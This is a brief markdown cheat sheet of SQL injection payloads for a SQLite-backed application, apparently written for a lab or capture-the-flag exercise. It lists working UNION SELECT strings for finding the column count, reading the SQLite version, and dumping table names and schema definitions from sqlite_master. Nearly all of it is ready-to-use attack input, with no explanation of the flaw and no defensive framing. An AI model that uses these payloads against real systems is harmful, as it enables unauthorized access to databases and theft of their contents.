# Get amount of columns

`test' and 1 = 0 union select 1,1--`
Then increment number of 1s until correct amount is found
`test' and 1 = 0 union select 1,1,1,1--`

# Get database version

`test' and 1 = 0 union select 1,sqlite_version(),1--`

# Reveal tables

`test' and 1 = 0 union select 1,group_concat(tbl_name),1,1 from sqlite_master--`
`test' and 1 = 0 union select 1,group_concat(sql),1,1 from sqlite_master--`
